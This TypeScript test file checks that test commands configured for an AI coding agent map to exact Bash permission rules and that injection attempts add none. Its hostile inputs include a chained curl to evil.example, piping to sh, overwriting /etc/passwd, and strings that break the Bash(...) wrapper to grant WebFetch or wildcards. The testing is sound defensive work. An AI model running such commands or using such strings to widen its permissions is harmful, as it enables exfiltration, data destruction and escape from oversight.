/**
 * The derived test-running exec grant, end to end across the two packages that must agree about it (`PLAN-M13.md` P23,
 * `SPEC-QUESTIONS.md` Q230): `@forge/engine`'s derivation (`deriveTestExec`, `grantWithTestExec`) and the Claude Code
 * adapter's mapping of a grant to `--allowedTools` (`mapToolGrantToAllowedTools`). Neither package may import the other, so
 * this root test is where a configured test command is followed all the way to the rule the platform is told.
 *
 * The property: whatever the project's `execution.testCommands` holds, the only `Bash(...)` rules the derivation adds are
 * one per configured command, each with the command verbatim and no wildcard; a value that could widen (a `*`, a chain, a
 * parenthesis that would close the wrapper) adds no rule at all.
 */
import { mapToolGrantToAllowedTools } from '@forge/adapter-claude-code';
import type { ToolGrant } from '@forge/adapter-kit';
import { deriveTestExec, grantWithTestExec, testLayersForBrief } from '@forge/engine/dispatch';
import { describe, expect, it } from 'vitest';

const AGENT: ToolGrant = { read: true, write: true, exec: ['git *', 'ls*'], network: 'none' };

function rulesFor(
  testCommands: Record<string, string>,
  brief = 'implement-story',
): readonly string[] {
  const derived = deriveTestExec(testCommands, testLayersForBrief(brief));
  return mapToolGrantToAllowedTools(grantWithTestExec(AGENT, derived));
}

describe('configured test commands reach the platform as exact rules', () => {
  it('each configured command becomes one verbatim rule after the agent’s own', () => {
    expect(
      rulesFor({ unit: 'pnpm test', lint: 'pnpm run lint:ci', typecheck: 'pnpm typecheck' }),
    ).toEqual([
      'Read',
      'Edit',
      'Write',
      'Bash(git *)',
      'Bash(ls*)',
      'Bash(pnpm typecheck)',
      'Bash(pnpm run lint:ci)',
      'Bash(pnpm test)',
    ]);
  });

  it('a value with a `*` injected (trailing, embedded, quoted) adds no rule, so it cannot become a wildcard rule', () => {
    for (const hostile of [
      'pnpm test *',
      'pnpm test*',
      'pnpm *',
      '*',
      'vitest run src/*.test.ts',
      "grep '*' x",
    ]) {
      const rules = rulesFor({ unit: hostile });
      expect(rules, hostile).toEqual(['Read', 'Edit', 'Write', 'Bash(git *)', 'Bash(ls*)']);
    }
  });

  it('a value that would close the Bash(...) wrapper and open a second rule adds no rule', () => {
    for (const hostile of ['pnpm test) WebFetch(domain:*', 'x) Bash(*', 'pnpm test) Edit(']) {
      const rules = rulesFor({ unit: hostile });
      expect(
        rules.filter((rule) => rule.startsWith('Bash(')),
        hostile,
      ).toEqual(['Bash(git *)', 'Bash(ls*)']);
      expect(
        rules.some((rule) => rule.startsWith('WebFetch')),
        hostile,
      ).toBe(false);
    }
  });

  it('a chained or redirected value adds no rule (an exact pattern is exempt from the operator veto, so it must never be derived)', () => {
    for (const hostile of [
      'pnpm test && curl https://evil.example/x',
      'pnpm test; rm x',
      'pnpm test | sh',
      'pnpm test > /etc/passwd',
      'pnpm test\nrm x',
    ]) {
      expect(rulesFor({ unit: hostile }), hostile).toEqual([
        'Read',
        'Edit',
        'Write',
        'Bash(git *)',
        'Bash(ls*)',
      ]);
    }
  });

  it('a step whose brief runs no tests maps to the agent’s own rules only', () => {
    expect(rulesFor({ unit: 'pnpm test' }, 'plan-story')).toEqual([
      'Read',
      'Edit',
      'Write',
      'Bash(git *)',
      'Bash(ls*)',
    ]);
  });

  it('a session with no exec maps to no Bash rule at all, however the tests are configured', () => {
    const derived = deriveTestExec({ unit: 'pnpm test' }, ['unit']);
    const rules = mapToolGrantToAllowedTools(
      grantWithTestExec({ read: true, write: false, exec: false, network: 'none' }, derived),
    );
    expect(rules).toEqual(['Read']);
  });

  it('every command the derivation grants reaches the platform as exactly one verbatim rule (block [6] never lists a command the platform would deny)', () => {
    const candidates = [
      'pnpm test',
      'pnpm run test:unit',
      'go test -run A,B',
      'pnpm test -t "a (b)"',
      'node -e "process.exit(1)"',
      "pytest -q 'tests/unit'",
      'vitest run --config ../vitest.config.ts',
      './scripts/run-tests.sh --fast',
      'make test',
      'cargo test',
      'pnpm\u00a0test',
      '"pnpm" test',
    ];
    for (const command of candidates) {
      const derived = deriveTestExec({ unit: command }, ['unit']);
      const withOwn = mapToolGrantToAllowedTools(
        grantWithTestExec({ read: false, write: false, exec: ['git *'], network: 'none' }, derived),
      );
      const granted = derived.granted.map((entry) => `Bash(${entry.command})`);
      expect(withOwn, command).toEqual(['Bash(git *)', ...granted]);
      // Granted means carried: a command the adapter would drop is not granted.
      expect(granted.length + derived.unavailable.length, command).toBe(1);
    }
  });
});
